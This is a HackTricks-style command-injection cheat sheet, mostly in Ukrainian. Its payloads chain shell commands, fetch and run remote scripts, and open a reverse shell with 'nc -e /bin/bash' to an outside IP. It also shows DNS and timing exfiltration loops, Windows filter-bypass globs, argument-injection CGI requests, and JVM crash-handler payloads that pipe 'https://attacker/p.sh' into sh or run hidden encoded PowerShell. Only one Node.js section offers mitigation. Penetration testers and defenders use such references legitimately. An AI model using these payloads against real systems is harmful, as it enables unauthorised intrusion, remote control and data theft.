# Command Injection

{{#include ../banners/hacktricks-training.md}}

## What is command Injection?

A **command injection** дозволяє виконувати довільні команди операційної системи на сервері, що хостить додаток. Внаслідок цього додаток та всі його дані можуть бути повністю скомпрометовані. Виконання таких команд зазвичай дозволяє атакуючому отримати несанкціонований доступ або контроль над середовищем додатка та підлягаючою системою.

### Context

Залежно від того, **куди саме вбудовується ваше введення**, можливо, доведеться **завершити контекст у лапках** (використовуючи `"` або `'`) перед командами.

## Command Injection/Execution
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
### **Обмеження** Bypasses

Якщо ви намагаєтеся виконати **довільні команди всередині linux-машини**, вам буде цікаво прочитати про ці **Bypasses:**


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **Приклади**
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```
### Параметри

Нижче наведено топ-25 параметрів, які можуть бути вразливі до code injection та подібних RCE vulnerabilities (за даними [link](https://twitter.com/trbughunters/status/1283133356922884096)):
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
### Time based data exfiltration

Витяг даних: символ за символом
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
### DNS based data exfiltration

Базується на інструменті з `https://github.com/HoLyVieR/dnsbin`, також розміщеному на dnsbin.zhack.ca
```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```
Онлайн інструменти для перевірки DNS based data exfiltration:

- dnsbin.zhack.ca
- pingb.in

### Filtering bypass

#### Windows
```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```
#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` vs `execFile`

Під час аудиту серверної частини на JavaScript/TypeScript ви часто стикатиметесь з Node.js `child_process` API.
```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
/* … */
});
```
`exec()` запускає **shell** (`/bin/sh -c`), тому будь-який символ, що має спеціальне значення для shell (back-ticks, `;`, `&&`, `|`, `$()`, …), призведе до **command injection**, коли введення користувача підставляється в рядок.

**Пом'якшення:** використовуйте `execFile()` (або `spawn()` без опції `shell`) і передавайте **кожен аргумент як окремий елемент масиву**, щоб shell не використовувався:
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
'--id_user', id_user,
'--payload', JSON.stringify(payload)
]);
```
Реальний випадок: *Synology Photos* ≤ 1.7.0-0794 був уразливим через неавторизовану WebSocket подію, яка поміщала контрольовані нападником дані в `id_user`, що пізніше вбудовувалися в виклик `exec()`, досягаючи RCE (Pwn2Own Ireland 2024).

### Argument/Option injection via leading hyphen (argv, no shell metacharacters)

Не всі ін'єкції вимагають shell-метасимволів. Якщо застосунок передає неперевірені рядки як аргументи в системну утиліту (навіть з `execve`/`execFile` і без shell), багато програм усе одно трактуватимуть будь-який аргумент, що починається з `-` або `--`, як опцію. Це дозволяє нападнику змінювати режими роботи, шляхи виводу або викликати небезпечну поведінку, не потрапляючи в shell.

Типові місця, де це зустрічається:

- Embedded web UIs/CGI handlers, які будують команди типу `ping <user>`, `tcpdump -i <iface> -w <file>`, `curl <url>` тощо.
- Centralized CGI routers (наприклад, `/cgi-bin/<something>.cgi` з параметром-селектором на кшталт `topicurl=<handler>`), де кілька обробників повторно використовують однаковий слабкий валідатор.

Що спробувати:

- Передавати значення, що починаються з `-`/`--`, щоб вони були сприйняті як прапорці downstream-утилітою.
- Зловживати прапорцями, які змінюють поведінку або записують файли, наприклад:
  - `ping`: `-f`/`-c 100000` щоб навантажити пристрій (DoS)
  - `curl`: `-o /tmp/x` щоб записати довільні шляхи, `-K <url>` щоб завантажити конфіг, контрольований нападником
  - `tcpdump`: `-G 1 -W 1 -z /path/script.sh` щоб досягти виконання після ротації в небезпечних обгортках
- Якщо програма підтримує `--` end-of-options, спробуйте обійти наївні пом'якшення, які додають `--` у неправильному місці.

Generic PoC shapes against centralized CGI dispatchers:
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Flip options in a downstream tool via argv injection
topicurl=<handler>&param=-n

# Unauthenticated RCE when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;
```
### JVM діагностичні зворотні виклики для гарантованого exec

Будь-який примітив, що дозволяє вам **inject JVM command-line arguments** (`_JAVA_OPTIONS`, launcher config files, `AdditionalJavaArguments` fields in desktop agents, etc.) можна перетворити на надійний RCE без змін application bytecode:

1. **Примусьте детермінований збій** шляхом зменшення metaspace або heap: `-XX:MaxMetaspaceSize=16m` (or a tiny `-Xmx`). Це гарантує `OutOfMemoryError` навіть під час раннього bootstrap.
2. **Прикріпіть обробник помилок**: `-XX:OnOutOfMemoryError="<cmd>"` or `-XX:OnError="<cmd>"` виконує довільну команду ОС щоразу, коли JVM аварійно завершується.
3. За бажанням додайте `-XX:+CrashOnOutOfMemoryError`, щоб уникнути спроб відновлення і зробити payload одноразовим.

Приклади payload:
```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand <blob>"
-XX:MaxMetaspaceSize=12m -XX:OnOutOfMemoryError="/bin/sh -c 'curl -fsS https://attacker/p.sh | sh'"
```
Оскільки ці діагностики розбирає сам JVM, shell-метасимволи не потрібні, і команда запускається з тим самим рівнем цілісності (integrity level), що й лаунчер. Desktop IPC bugs, які пересилають user-supplied JVM flags (див. [Localhost WebSocket abuse](websocket-attacks.md#localhost-websocket-abuse--browser-port-discovery)), тому безпосередньо призводять до виконання команд в ОС.

## Список для виявлення brute-force


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}


## Посилання

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Extraction of Synology encrypted archives – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [PHP proc_open manual](https://www.php.net/manual/en/function.proc-open.php)
- [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)
- [When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)

{{#include ../banners/hacktricks-training.md}}
